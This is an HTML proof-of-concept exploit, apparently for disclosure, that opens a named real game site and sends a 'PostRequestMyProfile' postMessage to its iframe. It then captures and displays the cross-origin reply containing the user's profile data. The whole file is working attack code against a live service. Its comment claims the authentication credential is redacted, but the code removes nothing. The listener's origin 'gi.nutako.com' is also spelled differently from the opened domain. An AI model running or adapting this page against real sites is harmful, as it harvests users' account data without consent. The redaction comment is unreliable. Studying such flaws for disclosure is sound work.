<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<title>Cross-Origin postMessage PoC</title>
	</head>
	<body>
		<h2>Cross-Origin postMessage PoC</h2>
		<button id="test">Open Game &amp; Send postMessage</button>
		<pre id="output">Waiting...</pre>

		<script>
			const output = document.getElementById("output");
			const messageDelay = 5000;
			let gameWindow = null;
			let receivedMessages = 0;

			document.getElementById("test").addEventListener("click", () => {
				receivedMessages = 0;
				output.textContent = "Opening game... Sending message in 5 seconds...";
				gameWindow = window.open(
					"https://www.nutaku.net/games/legeclo-x/play/",
					"legeclo_test"
				);

				if (!gameWindow) {
					output.textContent =
						"The popup was blocked. Please allow popups for this PoC page.";
					return;
				}

				setTimeout(() => {
					const gameFrame = gameWindow.frames[0];

					if (!gameFrame) {
						output.textContent = "The game page's first iframe was not found.";
						return;
					}

					output.textContent = "Sending PostRequestMyProfile to the first iframe...";
					gameFrame.postMessage(
						{
							method: "PostRequestMyProfile",
							methodArguments: {},
						},
						"*"
					);
				}, messageDelay);
			});

			window.addEventListener("message", (event) => {
				if (event.origin !== "https://gi.nutako.com") {
					return;
				}

				console.log("Incoming postMessage:", {
					origin: event.origin,
					data: event.data,
					source: event.source,
				});

				receivedMessages += 1;

				/*
				 * Only display the response locally.
				 * Redact the authentication credential before
				 * presenting the result.
				 */
				let response = event.data;

				if (response && typeof response === "object") {
					response = { ...response };
				}

				const responseText =
					"Message " +
					receivedMessages +
					" received from: " +
					event.origin +
					"\n\n" +
					JSON.stringify(response, null, 2);

				output.textContent =
					receivedMessages === 1
						? responseText
						: output.textContent + "\n\n" + responseText;
			});
		</script>
	</body>
</html>
